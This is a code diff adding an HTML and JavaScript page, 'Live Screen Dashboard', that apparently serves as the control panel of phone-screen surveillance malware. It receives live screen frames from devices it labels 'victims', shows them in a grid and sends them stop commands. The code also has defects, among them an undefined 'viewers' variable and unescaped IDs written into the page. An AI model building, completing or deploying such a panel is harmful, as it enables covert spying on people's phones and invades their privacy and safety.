@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Live Screen Dashboard</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            background: #0f0f23; color: #fff; 
+            font-family: -apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
+            height: 100vh; overflow: hidden;
+        }
+        .header { 
+            background: linear-gradient(90deg,#667eea,#764ba2); 
+            padding: 15px 30px; display: flex; justify-content: space-between; align-items: center;
+        }
+        .status { font-size: 18px; font-weight: 600; }
+        .grid { 
+            display: grid; grid-template-columns: repeat(auto-fill, minmax(420px, 1fr)); 
+            gap: 20px; padding: 30px; height: calc(100vh - 80px); overflow-y: auto;
+        }
+        .victim-card { 
+            background: rgba(255,255,255,0.05); 
+            border-radius: 20px; padding: 25px; backdrop-filter: blur(10px);
+            border: 1px solid rgba(255,255,255,0.1); transition: all 0.3s;
+        }
+        .victim-card:hover { transform: translateY(-5px); box-shadow: 0 20px 40px rgba(0,0,0,0.3); }
+        .victim-id { font-size: 20px; font-weight: bold; color: #4ade80; margin-bottom: 15px; }
+        canvas { 
+            width: 100%; height: 280px; border-radius: 15px; 
+            background: #1a1a2e; display: block; cursor: pointer;
+        }
+        .controls { margin-top: 15px; display: flex; gap: 10px; }
+        button { 
+            flex: 1; padding: 10px 15px; border: none; border-radius: 8px; 
+            cursor: pointer; font-weight: 600; transition: all 0.2s;
+        }
+        .stop-btn { background: #ef4444; color: white; }
+        .full-btn { background: #3b82f6; color: white; }
+        .status-dot { display: inline-block; width: 12px; height: 12px; 
+            border-radius: 50%; margin-right: 8px; }
+        .online { background: #10b981; }
+        .offline { background: #ef4444; animation: pulse 2s infinite; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="status">
+            <span class="status-dot online"></span>
+            Live Screen Dashboard
+        </div>
+        <div id="stats">0 phones • 0 viewers</div>
+    </div>
+    <div class="grid" id="grid"></div>
+
+    <script>
+        const ws = new WebSocket(`wss://${location.host}/`);
+        const grid = document.getElementById('grid');
+        const stats = document.getElementById('stats');
+        const streams = new Map();
+
+        ws.onopen = () => console.log('✅ Connected to dashboard');
+        
+        ws.onmessage = (e) => {
+            const data = JSON.parse(e.data);
+            handleMessage(data);
+        };
+
+        function handleMessage(data) {
+            if (data.type === 'init') {
+                data.victims.forEach(createStream);
+            } else if (data.type === 'victim_online') {
+                createStream(data.victimId);
+            } else if (data.type === 'victim_offline') {
+                updateStatus(data.victimId, 'offline');
+            } else if (data.type === 'frame') {
+                updateFrame(data);
+            }
+            updateStats();
+        }
+
+        function createStream(victimId) {
+            if (streams.has(victimId)) return;
+            
+            const card = document.createElement('div');
+            card.className = 'victim-card';
+            card.innerHTML = `
+                <div class="victim-id">
+                    📱 <span id="id-${victimId}">${victimId}</span>
+                    <span class="status-dot online" id="dot-${victimId}"></span>
+                </div>
+                <canvas id="canvas-${victimId}"></canvas>
+                <div class="controls">
+                    <button class="stop-btn" onclick="stopStream('${victimId}')">🛑 Disconnect</button>
+                    <button class="full-btn" onclick="fullscreen('${victimId}')">📱 Fullscreen</button>
+                </div>
+            `;
+            
+            grid.appendChild(card);
+            const canvas = document.getElementById(`canvas-${victimId}`);
+            streams.set(victimId, { canvas, ctx: canvas.getContext('2d'), status: 'online' });
+            
+            canvas.addEventListener('dblclick', () => fullscreen(victimId));
+        }
+
+        function updateFrame(data) {
+            const stream = streams.get(data.victimId);
+            if (!stream) return;
+            
+            const img = new Image();
+            img.onload = () => {
+                stream.canvas.width = data.width;
+                stream.canvas.height = data.height;
+                stream.ctx.drawImage(img, 0, 0);
+            };
+            img.src = `data:image/jpeg;base64,${data.data}`;
+        }
+
+        function stopStream(victimId) {
+            ws.send(JSON.stringify({type: 'command', victimId, action: 'stop'}));
+        }
+
+        function fullscreen(victimId) {
+            const canvas = document.getElementById(`canvas-${victimId}`);
+            if (canvas.requestFullscreen) canvas.requestFullscreen();
+        }
+
+        function updateStatus(victimId, status) {
+            const stream = streams.get(victimId);
+            if (stream) stream.status = status;
+            
+            const dot = document.getElementById(`dot-${victimId}`);
+            if (dot) dot.className = `status-dot ${status}`;
+        }
+
+        function updateStats() {
+            const count = streams.size;
+            stats.textContent = `${count} phone${count !== 1 ? 's' : ''} • ${viewers.size} viewer${viewers.size !== 1 ? 's' : ''}`;
+        }
+
+        // Update stats every 5s
+        setInterval(updateStats, 5000);
+    </script>
+</body>
+</html>
